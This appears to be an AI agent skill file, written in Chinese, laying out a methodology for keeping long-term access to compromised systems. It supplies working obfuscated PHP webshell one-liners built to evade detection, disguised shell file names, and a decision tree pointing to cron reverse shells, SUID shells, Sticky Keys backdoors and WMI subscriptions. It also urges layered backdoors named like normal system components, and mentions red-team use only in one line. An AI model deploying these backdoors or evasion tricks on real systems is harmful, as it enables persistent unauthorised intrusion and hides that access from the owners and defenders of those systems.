---
name: persist-maintain
description: "权限持久化方法论。当已获取目标系统权限后需要维持长期访问时使用。覆盖 Linux(cron/SSH key/webshell) 和 Windows(计划任务/服务/注册表/WMI) 持久化技术，以及 Web 层面的 webshell 部署和隐蔽策略"
metadata:
  tags: "persist,persistence,持久化,webshell,backdoor,后门,cron,scheduled task,service,维持访问"
  category: "postexploit"
---

# 权限持久化方法论

持久化核心：建立**不依赖原始漏洞**的访问通道。

## ⛔ 深入参考（必读）

- 需要 Linux/Windows 各种持久化技术的具体命令 → [references/persistence-techniques.md](references/persistence-techniques.md)

---

## Phase 1: Web 层持久化

### Webshell 部署
**部署位置（按隐蔽性）**：静态资源目录 > 上传目录 > 框架目录深处 > 已有文件末尾追加

**隐蔽 Webshell**：
```php
<?php @eval($_POST['cmd']);?>                    // 一句话
<?php $a='sys'.'tem'; $a($_GET['c']);?>          // 字符串拼接免杀
<?php array_map('assert', array($_POST['cmd']));?>  // 函数回调免杀
```
**文件名伪装**：`.htaccess`, `config.bak.php`, `error_log.php`, `.user.ini`

## Phase 2: 持久化决策树

```
目标操作系统？
├─ Linux
│   ├─ 有 SSH 访问？→ SSH 公钥（最可靠）
│   ├─ 需要自动回连？→ Cron 反弹 shell
│   ├─ 需要隐蔽？→ systemd 服务 / bashrc 后门
│   └─ 快速后门？→ SUID shell
├─ Windows
│   ├─ 有管理员权限？→ WMI 事件订阅（最难检测）
│   ├─ 需要开机启动？→ 注册表 Run 键 / 计划任务
│   └─ 有 RDP 访问？→ Sticky Keys 后门
└─ Web 层（通用）→ Webshell
详细命令 → [references/persistence-techniques.md](references/persistence-techniques.md)
```

## Phase 3: 多层持久化策略

不要只用一种——建立多层后门：
1. **第一层**：Webshell（Web 层，最容易恢复）
2. **第二层**：SSH 密钥或计划任务（系统层）
3. **第三层**：服务或 WMI 订阅（深层，难以发现）

## 注意事项
- 持久化越隐蔽越好——文件名/服务名/任务名应像正常系统组件
- 避免使用明显路径（如 `/tmp/backdoor.sh`）
- 在红队评估中，记录部署了什么、在哪里

## PHP Webshell 混淆
- 变量函数：`$$var` 动态调用，避免直接出现 eval/system（隐蔽执行）
- 替代函数：eval 替代为 assert，system 替代为 passthru 等

## 隐蔽性排名
- 不要修改 index.php 等核心文件——容易发现，危险
